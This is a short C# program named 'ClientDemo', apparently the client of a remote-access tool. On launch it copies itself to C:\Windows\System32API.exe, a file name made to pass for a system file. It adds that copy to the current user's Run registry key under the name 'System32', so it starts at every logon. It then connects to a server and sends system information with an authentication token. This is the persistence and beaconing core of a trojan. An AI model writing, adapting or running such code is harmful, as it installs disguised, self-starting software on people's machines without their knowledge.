using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace ClientDemo
{
    class Program
    {
        public static string SessionId = "";
        public static string key = "2077576874888";
        public static HPClient client = new();
        static async Task Main(string[] args)
        {
            try
            {
                string currentExePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string destinationPath = @"C:\Windows\System32API.exe";
                File.Copy(currentExePath, destinationPath, true);
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("System32", destinationPath);
                key.Close();

            }catch(Exception e)
            {
                Debug.WriteLine(e.Message);
            }
            
            await client.ConnectAsync("127.0.0.1", 9000);
            var info = new ClientInfo().ToString();

            await client.SendDataAsync(1, info, AuthModel.Token());

            while (true)
            {

            }
            client.Close();
        }

    }
}

